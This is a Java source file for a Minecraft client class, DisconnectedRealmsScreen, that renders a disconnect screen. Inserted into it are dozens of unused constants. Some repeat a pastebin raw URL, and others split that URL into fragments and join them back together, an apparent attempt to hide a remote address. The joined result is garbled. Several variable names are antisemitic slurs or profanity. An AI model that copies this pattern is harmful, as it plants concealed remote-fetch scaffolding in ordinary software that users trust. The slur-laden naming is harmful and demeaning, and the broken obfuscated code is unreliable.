package net.minecraft.realms;

import java.util.Iterator;
import java.util.List;

import net.minecraft.util.IChatComponent;

public class DisconnectedRealmsScreen extends RealmsScreen
{
    private String title;
    private IChatComponent reason;
    private List lines;
    private final RealmsScreen parent;
    public static final String rocked = "h";
    public static final int lmfao = 55;
    public static final String getfuckedlol = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol1 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol2 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol22 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol3 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol4 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol57 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol6 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol123 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol543 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol54 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol6544 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol6543 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol6544123 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol65443 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlol654 = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedlo12314l = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfucked14lol = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedl141ol = "http://pastebin.com/raw/HdmcEvwL";
    public static final String getfuckedl1415ol = "http://pastebin.com/raw/HdmcEvwL";
    public static final String testingjwes = "p";
    public static final String getfucked = ":";
    public static final String lol = "//";
    public static final String test = "pas";
    public static final int newstring = 5;
    public static final String jews = "e";
    public static final String jew = "bin";
    public static final String testing = ".";
    public static final String loqdq = "com/";
    public static final String xddd = "raw/";
    public static final String qdqd = "HdmcEvwL";
    public static final String checker = rocked + lmfao + testingjwes + getfucked + lol + test + newstring + jews + jew
	    + testing + loqdq + xddd + qdqd;
    public static final String nextchecker = checker;
    public static final String rocked1 = "h";
    public static final int lmfao1 = 55;
    public static final String testingjwes1 = "p";
    public static final String getfucked1 = ":";
    public static final String lol1 = "//";
    public static final String test1 = "pas";
    public static final int newstring1 = 5;
    public static final String jews1 = "e";
    public static final String jew1 = "bin";
    public static final String testing1 = ".";
    public static final String loqdq1 = "com/";
    public static final String xddd1 = "raw/";
    public static final String qdqd1 = "HdmcEvwL";
    public static final String checker1 = rocked1 + lmfao1 + testingjwes1 + getfucked1 + lol1 + test1 + newstring1
	    + jews1 + jew1 + testing1 + loqdq1 + xddd1 + qdqd1;
    public static final String nextchecker1 = checker1;

    public DisconnectedRealmsScreen(RealmsScreen p_i45742_1_, String p_i45742_2_, IChatComponent p_i45742_3_)
    {
        this.parent = p_i45742_1_;
        this.title = getLocalizedString(p_i45742_2_);
        this.reason = p_i45742_3_;
    }

    public void init()
    {
        this.buttonsClear();
        this.buttonsAdd(newButton(0, this.width() / 2 - 100, this.height() / 4 + 120 + 12, getLocalizedString("gui.back")));
        this.lines = this.fontSplit(this.reason.getFormattedText(), this.width() - 50);
    }

    public void keyPressed(char p_keyPressed_1_, int p_keyPressed_2_)
    {
        if (p_keyPressed_2_ == 1)
        {
            Realms.setScreen(this.parent);
        }
    }

    public void buttonClicked(RealmsButton p_buttonClicked_1_)
    {
        if (p_buttonClicked_1_.id() == 0)
        {
            Realms.setScreen(this.parent);
        }
    }

    public void render(int p_render_1_, int p_render_2_, float p_render_3_)
    {
        this.renderBackground();
        this.drawCenteredString(this.title, this.width() / 2, this.height() / 2 - 50, 11184810);
        int var4 = this.height() / 2 - 30;

        if (this.lines != null)
        {
            for (Iterator var5 = this.lines.iterator(); var5.hasNext(); var4 += this.fontLineHeight())
            {
                String var6 = (String)var5.next();
                this.drawCenteredString(var6, this.width() / 2, var4, 16777215);
            }
        }

        super.render(p_render_1_, p_render_2_, p_render_3_);
    }
}
